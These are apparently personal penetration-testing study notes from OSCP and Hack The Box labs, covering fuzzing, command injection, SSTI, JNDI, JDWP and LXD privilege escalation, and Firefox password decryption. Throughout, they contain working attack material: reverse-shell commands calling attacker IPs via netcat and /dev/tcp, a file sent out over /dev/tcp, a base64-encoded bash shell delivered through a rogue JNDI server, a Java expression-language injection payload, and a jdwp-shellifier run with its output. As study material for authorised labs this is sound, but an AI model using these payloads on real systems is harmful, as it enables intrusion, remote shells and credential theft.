eg: `python Reconoitre.py -t <IP_ADDR> -o <pwd>  --services`
Look at the "Findings.txt fils
- `cat *find*`
I will suggest commands to run:
eg: `gobuster dir -u http://10.129.198.51 -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -t 20 -o GobusterOutput.txt -b ''`


### Jar files
Good tool for decompileing them is `jd-gui` (on homebrew too but could not get to run - java Vesion ??)
`jar` files are just zipped files.
Class files can be unpacked with a tool called "jad"
#### export and expand a jar file
On the listener side open a netcat and direct ot a file 
- `nc -lvnp 9001 > MyNewRecievedFiile.jar`
- on the server side send the file with `cat TARGET-JAR.jar > /dev/tcp/10.10.14.22/9001`
- Extract locally with `7z x MyNewRecievedFiile.jar`
- or `unzip -d /tmp/app TARGET-JAR.jar`
  
### Zip , gzip
- `zip -r <FILETOEXTRACT> $(find /path/to/files/ -name "*.jar")   # Recursive Zip up all the found .jar files`	
- `gzip allthejars $(ls -lR / | grep -H ".jar$" | grep -v "cannot open directory" | cut -d " " -f12) # `
	
# Fuzzing 

## Wfuzz
A Brute force attack using `wfuzz` and a reverse string match against the response text ( --hs "Unknown username," for string hiding). 
Since we are not trying to find a valid password, we can use a dummy password.
- `wfuzz -c -z file,<USERNAME_LIST_FILE> -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://VICTIM`

```
wfuzz -e printers       #shows the different output types , eg raw, json
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt  -u http://192.168.179.147:17445/issue/checkByPriority/priority=FUZZ -v -f WUZZ-report.txt,raw  # Wfuzz starter fuzzing commanmd to get a report , see response simes 
``` 

### Fuzzing for Subdomains
- `wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 10.129.27.128 -H "Host: FUZZ.shoppy.htb" --hc 301`

### LFI RFI Fuzzing
Log poisoning LFI - One vector is via log files. If we find a log file we can inject, the system could have a php written into it from an attack. IF we can then call that file the systme may run it . 
Once you have a file inclusion and can read a file make a 2 line word list to see he invalid and valid response length; 1 line of a vaid file eg `/etc/passwd`, and the other of `invalid.foo`

```
/etc/passwd
invalid.foo
```
FIRST Inspect the lists and make edits eg `/home/USERNAME/blah`
```
wfuzz -hw 106 -c -z file, /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt http://192.10.10.10./Vuln/Fil.php?file=../../../..FUZZ    # RFI LFI Fuzzing - ok wordlist 
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt  http://127.0.0.1:9999/backend/?view=FUZZ                               # RFI LFI Fuzzing - Fav wordlist 
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt  --hh=757 http://127.0.0.1:9999/backend/?view=../../../../..FUZZ   # RFI LFI Fuzzing - Fav wordlist
```


### Parameter fuzzing to find mass-assignment vulns
1. Find an interesting endpoint where you get denied if unauthed.
2. Do a vinalla request to test it works and check all the headers are sent the srever needs.Somet imes the `Accept:` header needs to be a precise kind. You might need ot add that header to your Fuzzer.
3. copy the url and create a fuzz parameter set to `=1` or `=true` or some randone string `=foo` or `=0&1`
4. run A fuzzer like fuff with `FUZZ=1` or `FUZZ=true` based on a possible list of ( for example) api endpoints 
5. look for `200`'s or something similar.



```
seq 1 1000 > nums-1-1000.txt        # make a fuzz list of numbers digits 1 - 1000
```

### Wfuzz Docker Container
See: https://hub.docker.com/r/dominicbreuker/wfuzz
- `docker run wfuzz:latest -c -z file,wordlist/general/big.txt --hc 404 http://www.target.com/FUZZ`

---

## FuFF
put FUZZ on the param

`fuff hashcat FILE.req -request-proto http -w Seclist_SpecialChars.txt`
`fuff -request FILE.req -request-proto http -w Seclist_SpecialChars.txt -fs INT -mc all -mr 'somestring'`

`ffuf -u http://<IP_ADDRESS>/under_construction/forgot.php?email=FUZZ -w Unix-CMD.txt --enc auto -mr "uid="`   # Command injection - Offsec UC404
The above Command Injection command looks for a positive regex in the response form the id command : "uid="    For this one (uc404) the command injection was on the encoded new line char.

**WHERE:**
- `-request FILE.req` 		# request file ike sqlmap but you need to place FUZZ in the location
- `-request-proto http` 		# this is the request protocol to try
- `-w Seclist_SpecialChars.txt` 	# wordlist file, The seclists Special chars is a good one ot start with
- `-fs INT`  	 	        	# filter out size of response
- `-mc all` 	 		        # match codes eg 200 , this matches all so yo use everything!
- `-mr 'somestring'`	        # -mr == match regex so you can only return things you want to see based on ) for exampke ) a particlar error message)

**Also: **

- `ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://IPADDRESS/FUZZ -t 100 -recursion -recursion-depth 5 -o FFUF_urls.txt`
- `ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://IPADDRESS/FUZZ -t 100 -recursion -recursion-depth 3 -e .php,.txt,.html -v -o FFUF_urls.txt`

Q: what is entity encoding exactly?

# TIPS 
When ippsec sees params fail with:
- `{`, `[`, `(`   # It's more likly **SSTI**
- `",` ,`'`       # It's likly **Sqli**
- `;`, `|`, `&`   # It's likely **Command Injection**


```
!
"
#
$
%
&
'
(
)
*
+
,
-
.
/
:
;
<
=
>
?
@
[
\
]
^
_
`
{
|
}
~
£
€
¥
¢
§
©
®
™
±
÷
×
¬
¶
•
°
·
¯
¿
```


Some Command injection fuzz lists can be found in `/home/kali/OSCP/OSCP-COURSE-Notes/OSCP-Obsidian-Vault/TOOLS/WordLists-Bespoke`. Taken fro mthe site: https://github.com/payloadbox/command-injection-payload-list
- be sure with POST anf GET requests
- `curl http://192.168.179.109/under_construction/forgot.php?email=%0A/usr/bin/id`

### Command injection
- `;`, `|`, `&`   # It's likely **Command Injection** ( Says ippsec)
- Payloads - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection -                                                 - Command Injection
- Hacktricks - https://github.com/HackTricks-wiki/hacktricks/blob/a06174cf560d32b896f38caf913f859b4b286b70/src/pentesting-web/command-injection.md - Command Injection 


Things to try with Command Injection 
- wrap both ends the command in things like `;` 
- URL encode command injection payload **NOT FROM BURP** but from a site like https://www.urlencoder.org/ ( its dirfferent)
- If you sense command injection but your test payloads are working just go stright for a REV SHELL ... You never know!!

#### Custom Fuzz lists

Create custom fuzz lists from found txt files
```
tr -s '[:space:]' '\n' < BaseInputText.txt | sed 's/[[:punct:]]//g' | sort | uniq >> GenratedFuzzList.txt
```


Special Chars list fuzz list
```
,./;'[]\-=<>?:"{}|_+!@#$%^&*()`~
,
.
/
;
'
[
]
\
-
=
<
>
?
:
"
{
}
|
+
!
@
#
$
%
^
&
*
(
)
`
~
```

----

### ldeep (ldap tool)

https://github.com/franc-pentest/ldeep 

```
ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"


[+] User CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM successfully added to CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM
```

This out put shows that Tracy is now able to login eg; via evil-winrm



## JNDI (HTB - Unified)
JNDI is the acronym for the Java Naming and Directory Interface API . By making calls to this API,
applications locate resources and other program objects. A resource is a program object that provides
connections to systems, such as database servers and messaging systems.

A malicious LDAP server for JNDI injection attacks. The project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.

- https://github.com/veracode-research/rogue-jndi


## Privesc via JDWP (Java Debug Wire Protocol) 

### Overview

The victim might have a crappy local app running on port 5000 and also a jdwp diagnostic port running locally on port 8000. jdwp is unprotected and so with the right tool we can get the jdwqp to run commands on the victim. Especially sqawn a shell,

https://www.exploit-db.com/exploits/46501
https://github.com/IOActive/jdwp-shellifier

To help we should get ssh login ( perhaps by writing our public key to the victims `authrorized_keys`) so we can set up a local port forwarding so we can interrogate the victim `jdwp` from our attack machine.


This tool requires python2 to run locally from out Attack machine - https://github.com/IOActive/jdwp-shellifier/blob/master/jdwp-shellifier.py

---

We can tell if jdwp is run by looking for java process with `netstat -tulpn`
then with this ps command we can see what comand started it  
```
ps -p <PID> -o cmd
```
There may also be some java code availible to see whats going on.


Once we have set up authorised keys on the victim machine of the kali public key we can ssh into the machine with a local portforward:
```
ssh -i id_rsa dev@192.168.112.150 -L 8000:127.0.0.1:8000
```


Then we can use this **python2** `jdwp-shellifier.py` exploit/Script run from out attack machine  https://github.com/IOActive/jdwp-shellifier/blob/master/jdwp-shellifier.py


Before we run the script below , we should set up a listener to recieve out shell 


Then we run the exploit:

```sh
python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc 192.168.45.211 4443 -e sh'
```

```sh
┌──(kali㉿kali)-[~/…/MockExams/B-OSCP/Standalones/Berlin]
└─$ python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc 192.168.45.211 4443 -e sh'
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.16'
[+] Found Runtime class: id=8b1
[+] Found Runtime.getRuntime(): id=7f82e002e0b8
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'

--- !!! this is where we need to trigger an event: SEE BELOW !!! --- 

[+] Received matching event from thread 0x94d
[+] Selected payload 'busybox nc 192.168.45.211 4443 -e sh'
[+] Command string object created id:94e
[+] Runtime.getRuntime() returned context id:0x94f
[+] found Runtime.exec(): id=7f82e002e0f0
[+] Runtime.exec() successful, retId=950
[!] Command successfully executed

```


We will then need to create an event on the victim machine

```sh
dev@oscp:/tmp$ nc 127.0.0.1 5000
Available Processors: 1
Free Memory: 25630216
Total Memory: 32440320

...HANGS
```

We should then get the shell back to out listener

-----


## LDAP
LDAP is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,
industry standard application protocol for accessing and maintaining distributed directory information
services over the Internet or a Network. The default port that LDAP runs on is port 389 .

### Commands from HTB Tier2 Unified - JNDI and LDAP attack
`sudo tcpdump -i tun0 port 389   # Check if we get a call back to our Fake ldap port.`
`sudo apt-get install openjdk-11-jdk -y # install the java 11 openjdk` 
`sudo apt-get install maven`
`git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package`
`echo 'bash -c bash -i >&/dev/tcp/MY_IP/4444 0>&1' | base64 # == YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTAyLzQ0NDQgMD4mMQo`
`java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,MY_B64_BLOB_FROM_ABOVE}|{base64,-d}|{bash,-i}" --hostname "MY_IP"`
- Set payload on the "Remember" Param in the post to : `${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}`

- on the reverse shell type `script /dev/null -c bash`
- `find / -type f -name user.txt # find the user flag`
- `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);" 	# Find all the users on a mongo DB`				
- `mkpasswd -m sha-512 Tuesday@24 # Create a sha-512 hash of the PW "Tuesday@24"   === $6$p9bSlPO06dPHfG9s$xsJXbX.RUKKnp2DIP/1qJY.kgT9cjrPQWYdx/iXP3KkEYtNAkf5JBCHOWor7vqcCzuLkOiw9Ar5TB3O6OAUAt0 `
- `mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<USER_ID_HASH>")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})' # Change the administrato PW to the PW above (hash)` 

### Regexes for vs code
`password(.*)"(.*)"`# find the term "password" followed by anything and then a pair of quotations marks with text within them
`auth(.*)"(.*)"`# find the term "auth" followed by anything and then a pair of quotations marks with text within them

### Finding secrets in code
`detect-secrets -C . scan > .secrets.basline` # Run detect secrts and make a basline file for the repo
`detect-secrets audit .secrets.baseline`

`trufflehog --regex <FULLPATHTOCODE>`

```
find . -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.xml" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.env" -o -name "*.properties" -o -name "*.java" -o -name "*.htaccess" -o -name "*.nginxconf" -o -name "*.toml" -o -name "*.cnf" -o -name "*.mycnf" -o -name "*.ora" -o -name "*.db" -o -name "*.sql" -o -name "*.webconfig" -o -name "php*.ini" -o -name "*.sh" -o -name "*.bat" -o -name "*.cmd" -o -name "*.ps1" -o -name "*.rb" -o -name "*.py" -o -name "Dockerfile" -o -name "*.vmx" -o -name "Vagrantfile" -o -name "*.pcf" -o -name "*.ovpn" -o -name "*.gitconfig" -o -name "*.hgignore" -o -name "*.plist" -o -name "*.reg" \) -exec grep -HnE "(username|user|userid|login|passw|password|passwd|pass|api[_-]?key|access[_-]?token)[:=]\s*[\"']?\w+[\"']?" {} + > Conf-Report.txt  # Findings secrets in conf files etc
```

```
find / -type f \( -name "*.java" -o -name "*.py" -o -name "*.js" -o -name "*.ts" -o -name "*.sh" -o -name "*.bash" -o -name "*.zsh" -o -name "*.c" -o -name "*.cpp" -o -name "*.h" -o -name "*.php" -o -name "*.rb" -o -name "*.pl" -o -name "*.pm" -o -name "*.html" -o -name "*.css" -o -name "*.xml" -o -name "*.go" -o -name "*.cs" -o -name "*.rs" -o -name "*.scala" -o -name "*.kt" -o -name "Dockerfile" -o -name "*.env" -o -name "*.properties" -o -name "*.yml" -o -name "*.yaml" -o -name "*.json" -o -name "*.conf" -o -name "*.config" \)  -exec grep -HnE "(username|user|userid|login|passw|password|passwd|pass|api[_-]?key|access[_-]?token)[\"']?\s*[:=,)\s]*[\"']?\w+[\"']?" {} + > Secrets-InCode-Report.txt     # find secrets in source code files maybe?

```


## tftp
Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. 
TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides.  
It is also revealed that TFTP uses the User Datagram Protocol (UDP) to communicate. 
This is defined as a lightweight data transport protocol that works on top of IP.

### udp 
UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to solve other problems that arise with packets, such as lost or out of order packets.
It is implemented in the transport layer of the OSI Model, known as a fast but not reliable protocol, unlike TCP, which is reliable, but slower then UDP.
Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and etcetera, the same way UDP has ports for protocols that work for UDP.

### LXD (htb: Included)
LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.

To REad - https://www.hackingarticles.in/lxd-privilege-escalation/

`Linux Container (LXC)` are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.

`Linux daemon (LXD)` is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.

- `apt install lxd`
- `apt install zfsutils-linux`
- `usermod --append --groups lxd Bob`
- `lxd init`
- `lxc launch ubuntu:18.04`
- `lxc list`

LXD Privesc
- `git clone  https://github.com/saghul/lxd-alpine-builder.git`
- `cd lxd-alpine-builder`
- `./build-alpine`
- `lxc init myimageNasty ignite -c security.privileged=true` - This security switch is key
- `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`
- `lxc start ignite`
- `lxc exec ignite /bin/sh`
- `id`


## URL Encoding
When making a request to a web server, the data that we send can only contain certain characters from the
standard 128 character ASCII set. Reserved characters that do not belong to this set must be encoded. For
this reason we use an encoding procedure that is called URL Encoding . With this process for instance, the reserved character `&` becomes `%26` .

## SSTI
Template engines are designed to generate web pages by combining fixed templates with volatile data. 
Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. 
This allows attackers to inject arbitrary template directives in order to manipulate the template engine, 
often enabling them to take complete control of the server.

Tool - https://github.com/epinna/tplmap

Node.js and Python web backend servers often make use of a software called "Template Engines".

SSTI - This is a good article - https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

**Polyglot SSTI payload**
 - If it is doing SSTI , this could make it crash. If it prints. it is not SSTI injectiable

```
${{>%[%'"}}%
``` 

- You’re not sure which engine:
    - Test a handful: `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%=7*7%>`.
    - Look at error messages / output shape → identify engine (PortSwigger guide style). [PortSwigger+1](https://portswigger.net/web-security/server-side-template-injection?utm_source=chatgpt.com)
- Once identified, read docs for _that_ engine (Jinja2, Twig, etc.).
- Exploitation focuses on:
    - Accessing template context objects.
    - Walking into language runtime (Python, PHP, etc.).
    - Getting to file system / OS command APIs.



**Java based Expression Language Injection payload**
```
${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("busybox nc 192.168.45.167 4444 -e sh")}       # Java baseed Expression Language Injection payload
```



### What is a Template Engine?

Template Engines are used to display dynamically generated content on a web page. They replace the
variables inside a template file with actual values and display these values to the client (i.e. a user opening a
page through their browser).
For instance, if a developer needs to create a user profile page, which will contain Usernames, Emails,
Birthdays and various other content, that is very hard if not impossible to achieve for multiple different
users with a static HTML page. The template engine would be used here, along a static "template" that
contains the basic structure of the profile page, which would then manually fill in the user information and
display it to the user.
Template Engines, like all software, are prone to vulnerabilities. The vulnerability that we will be focusing on
today is called Server Side Template Injection (SSTI).

## What is an SSTI?
Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order
to execute commands on the server.
To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template
Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code
execution on the affected server.
This attack is very common on Node.js websites and there is a good possibility that a Template Engine is
being used to reflect the email that the user inputs in the contact field.

The given input is being rendered and reflected into the response. This is easily mistaken for a simple XSS, vulnerability, but it's easy to differentiate if you try to set mathematical operations within a template expressins( as below)
### Basic SSTI payloads
```
${{<%[%'"}}%\   # Polyglot
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{8*8}
```
In order to check if the server is vulnerable you should spot the differences between the response with regular data on the parameter and the given payload.
If an error is thrown it will be quiet easy to figure out that the server is vulnerable and even which engine is running. But you could also find a vulnerable server if you were expecting it to reflect the given payload and it is not being reflected or if there are some missing chars in the response.


### Cheatsheet
`alias chee='callCheatSh(){ curl cheat.sh/"$@" ;}; callCheatSh'`            # call Cheat.sh for cheat sheets on an cli tool

### Misc
`brew cleanup` clean up HTB memory on Mac

```
# HTB Jerry ( 1 liner Encode User/PW combos into B64)
for i in $(cat fileA.txt); do for j in $(cat fileB.txt); do echo $i:$j | base64; done; done
```
### Install Wine ( run windows exe on KAli i think )
- `apt install wine`
- `dpkg --add-architecture i386 && apt-get update && apt-get install wine32:i386`
- Then can run `Ollydbg` `ollydbg`

### Disable the CSS by pasting the following into the dev tools console
- `var el = document.querySelectorAll('style,link'); for (var i=0; i<el.length; i++) {el[i].parentNode.removeChild(el[i]);};`
- `brew install mitmproxy`
- `pip3 install mitmproxy2swagger # Plugin to scrape an api of all its endpoints`

### Regexes for vs code

- `password(.*)"(.*)"`# find the term "password" followed by anything and then a pair of quotations marks with text within them
- `auth(.*)"(.*)"`# find the term "auth" followed by anything and then a pair of quotations marks with text within them

### Secrets and Trufflehog
- `detect-secrets -C . scan > .secrets.basline` # Run detect secrts and make a basline file for the repo
- `detect-secrets audit .secrets.baseline`
- `trufflehog --regex <FULLPATHTOCODE>`
## Trivy ( scan local code from within a container)
- `docker container run --rm -it -v $(pwd):/mnt/reports aquasec/trivy fs /mnt/reports/code_delete/cp4s-dataservices-operator -o /mnt/reports/LocalReportName.json`

Where:
- `run --rm`  # get rid of the data after you ran it 
- `fs < path>` # dir you want to scan
- `-v $(pwd):/mnt/reports` # Volume you want to mount between host and container, in this case out code will be in `/mnt/reports`
- `-o /mnt/reports/LocalReportName.json`  # the name of the report whihv shall appear on your machine
### har file to urls
- `cat MY-ZAP-HAR.har | jq ".log.entries[].request.url" | sort | uniq  | egrep -v anything_out_of_scope | sed -e 's/\"//g;' > url_list.txt`

### doctl (Digital Ocean cli tool)
```
doctl auth init											# intitialise Auth for the site ( Requires submission of api key) 
doctl compute ssh-key list								# list all the curretn ssh keys 

# CREATE A NEW DROPLET
doctl compute droplet create --image ubuntu-22-04-x64 --size s-1vcpu-1gb --region nyc1 --ssh-keys <SSH-KEY_ID> <CHOOSEN-NAME-OF-DROP>
doctl compute droplet delete <DROPLET-ID|DROPLET-NAME>
doctl compute droplet list --format "ID,Name,PublicIPv4"  # lists droplets in format
doctl compute droplet list --format "PublicIPv4"		  # lists droplets in juts with Ip adress
```


### Testing for clickjacking

JZ testing DS:

1. Login into the application
1. Create a new webpage with the following HTML code
1. Load the new web page in the browser

```html
<html>
   <head>
     <title>Clickjack Test Page</title>
   </head>
   <body>
     <h2>Website is vulnerable to clickjacking!</h2>
        <iframe src="<AN_EXISTING_PAGE_ON_THE_TARGET_SITE>" width="800" height="600" 
               security="restricted" ></iframe>
   </body>
</html>
```

#### Mozilla/ Firefox stored password cracking 
If we discover firefox is installed we can look for credentials ( OSPG InsanityMonitoring ) this tool will help us
- https://github.com/unode/firefox_decrypt

Dependeing on the version of Firefox you have We need the following files from the victim 
```
cookies.sqlite
key4.db
cert9.db
logins.json
```

Where:
- **`logins.json`** — this holds the **encrypted credentials** (the `encryptedUsername`/`encryptedPassword` blobs plus site metadata). Without it, there’s nothing to decrypt.
- **`key4.db`** — this is the **NSS key database** that stores the secret key material used to protect `logins.json`. If a Primary (Master) Password was set, it’s used to unwrap the key from here. You need this to actually decrypt the login blobs.
- **`cert9.db`** — Firefox’s **certificate store**. While it doesn’t contain the passwords, the NSS library initializes the profile’s crypto using both the **key** DB (`key4.db`) and the **cert** DB (`cert9.db`). Some setups won’t open the key DB cleanly unless the cert DB is present, so tools that drive NSS (like `firefox_decrypt`) expect both.
- **`cookies.sqlite`** — **not required** to decrypt saved passwords. It’s the cookie jar (session tokens, remember-me cookies, etc.). Useful for session hijacking or validating access once you have creds, which is why many playbooks grab it alongside the passwords.

Once we have installed the tool locally and got the files where we want them we can run this command 

```
python firefox_decrypt.py ../DIR_OF_FILES/
```

With Output like: 
```
2026-02-12 11:40:52,566 - WARNING - profile.ini not found in ../PE_FIREF/
2026-02-12 11:40:52,566 - WARNING - Continuing and assuming '../PE_FIREF/' is a profile location

Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
```



### Cheatsheet
- `alias chee='callCheatSh(){ curl cheat.sh/"$@" ;}; callCheatSh'`   # not too safe if it gets comprimised


# LinWinPwn
- https://github.com/lefayjey/linWinPwn

```
lwp             # Linwinpwn - this is my local alias . Stored in the Tools repo
```

# TO READ
- https://dev.mysql.com/doc/refman/8.0/en/connecting.html
- https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/
- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
- https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds#lfi
- https://en.wikipedia.org/wiki/Virtual_hosting # Ignition.htb
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection # SSTI

- PAYLOAD ALL THE THINGS - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege
- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

Tools to understand
- https://github.com/SpiderLabs/Responder
- https://github.com/Hackplayers/evil-winr
- Rev Shell generator - https://www.revshells.com/
- Impaket : https://github.com/fortra/impacket
- Impacket MySQL - https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py
- https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/

Pentesting Course To Read 

- [5 pen testing rules of engagement: What to consider while performing Penetration testing](https://hub.packtpub.com/penetration-testing-rules-of-engagement/) - TDO Reado
- [SANS Rules of Engagement worksheet](https://www.sans.org/posters/pen-test-rules-of-engagement-worksheet/)
- [Top 20 Google Hacking Techniques](https://securitytrails.com/blog/google-hacking-techniques) - TODO read

Forensics Course

TO read: 
- https://www.nist.gov/digital-evidence
- https://www.ojp.gov/pdffiles1/nij/grants/248770.pdf
- https://learn.ibm.com/pluginfile.php/1075656/mod_page/content/1/Chain%20of%20Custody%20Form%20Example.docx
  
TO REad: - https://www.sans.org/blog/intro-to-report-writing-for-digital-forensics/
TO READ: Forensics on Mobile
- https://csrc.nist.gov/projects/mobile-security-and-forensics
- https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-101r1.pdf

- https://www.ufsexplorer.com/articles/chances-for-data-recovery.php
- https://www.ufsexplorer.com/articles/file-systems-basics/


Incident Response Course 

TO DO read this doc - https://www.sans.org/white-papers/2021/

TO READ - Case study on Reviewing the IR process - https://www.sans.org/reading-room/whitepapers/incident/practical-incident-response-network-based-attack-37920

To read: (SANS Summary of SANS vs NIST frame works)[https://cybersecurity.att.com/blogs/security-essentials/incident-response-steps-comparison-guide]

To read: Tools - https://www.cynet.com/blog/the-7-best-free-and-open-source-incident-response-tools/
TO READ :
- https://www.sans.org/reading-room/whitepapers/analyst/soc-automation-deliverance-disaster-38225
- https://www.sans.org/reading-room/whitepapers/analyst/empowering-incident-response-automation-38862


# Other set of Notes


_"must have the ability to competently identify, exploit, and explain these vulnerabilities"_

The top 20 most common mistakes web developers make that are essential for us as penetration testers are:
No. 	Mistake
1. 	Permitting Invalid Data to Enter the Database
2. 	Focusing on the System as a Whole
3. 	Establishing Personally Developed Security Methods
4. 	Treating Security to be Your Last Step
5. 	Developing Plain Text Password Storage
6. 	Creating Weak Passwords
7. 	Storing Unencrypted Data in the Database
8. 	Depending Excessively on the Client Side
9. 	Being Too Optimistic
10.	Permitting Variables via the URL Path Name
11.	Trusting third-party code
12.	Hard-coding backdoor accounts
13.	Unverified SQL injections
14.	Remote file inclusions
15.	Insecure data handling
16.	Failing to encrypt data properly
17.	Not using a secure cryptographic system
18.	Ignoring layer 8
19.	Review user actions
20.	Web Application Firewall misconfigurations

These mistakes lead to the OWASP Top 10 vulnerabilities for web applications, which we will discuss in other modules:
No. 	Vulnerability
1. 	Injection
2. 	Broken Authentication
3. 	Sensitive Data Exposure
4. 	XML External Entities (XXE)
5. 	Broken Access Control
6. 	Security Misconfiguration
7. 	Cross-Site Scripting (XSS)
8. 	Insecure Deserialization
9. 	Using Components with Known Vulnerabilities
10. Insufficient Logging & Monitoring

## URL Encoding
An important concept to learn in HTML is URL Encoding, or percent-encoding. For a browser to properly display a page's contents, it has to know the charset in use. In URLs, for example, browsers can only use ASCII encoding, which only allows alphanumerical characters and certain special characters. Therefore, all other characters outside of the ASCII character-set have to be encoded within a URL. URL encoding replaces unsafe ASCII characters with a % symbol followed by two hexadecimal digits.

For example, the single-quote character `'` is encoded to `%27`, which can be understood by browsers as a single-quote. URLs cannot have spaces in them and will replace a space with either a + (plus sign) or %20.

Character 	Encoding
```
space 	%20
! 	%21
" 	%22
# 	%23
$ 	%24
% 	%25
& 	%26
' 	%27
( 	%28
) 	%29
```

"The W3C Document Object Model (DOM) is a platform and language-neutral interface that allows programs and scripts to dynamically access and update the content, structure, and style of a document."

The DOM standard is separated into 3 parts:

    Core DOM - the standard model for all document types
    XML DOM - the standard model for XML documents
    HTML DOM - the standard model for HTML documents


[AJAX](https://en.wikipedia.org/wiki/Ajax_(programming))

## Frameworks

As web applications become more advanced, it may be inefficient to use pure JavaScript to develop an entire web application from scratch. This is why a host of JavaScript frameworks have been introduced to improve the experience of web application development.

These platforms introduce libraries that make it very simple to re-create advanced functionalities, like user login and user registration, and they introduce new technologies based on existing ones, like the use of dynamically changing HTML code, instead of using static HTML code.

These platforms either use JavaScript as their programming language or use an implementation of JavaScript that compiles its code into JavaScript code.

Some of the most common front end JavaScript frameworks are:

    [AngularJS](https://www.w3schools.com/angular/angular_intro.asp)
    [React.js](https://www.w3schools.com/react/react_intro.asp)
    [Vue.js](https://www.w3schools.com/whatis/whatis_vue.asp)
    [jQuery](https://www.w3schools.com/jquery/)

A listing and comparison of common JavaScript frameworks can be found [here](https://en.wikipedia.org/wiki/Comparison_of_JavaScript-based_web_frameworks).

 [Sensitive data exposure OWASP](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)

 _"one of the first things we should do when assessing a web application is to review its page source code to see if we can identify any 'low-hanging fruit', such as exposed credentials or hidden links."_

 ### Browser short key 
 ctl + u >> view web source code
 ctl + l >> copy address bar content
 ctl + k >> clear and positon cursor in address bar.
 ctl + w >> close tab
 ctl + t >> new tab
 ctl + D >> bookmark this page

## HTML injection `<<` NEEDS READING
[HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection) occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through JavaScript on the front end.

Q: If you wanted to inject a malicious link to "www.malicious.com", and have the clickable text read 'Click Me', how would you do that?
A : `<a href="www.malicious.com">Click Me</a>`


# Cross Site Scripting (XSS)

[XSS](https://owasp.org/www-community/attacks/xss/) `<<` NEEDS READING 

Type 	Description
**Reflected XSS** - Occurs when user input is displayed on the page after processing (e.g., search result or error message).
**Stored XSS** - Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).
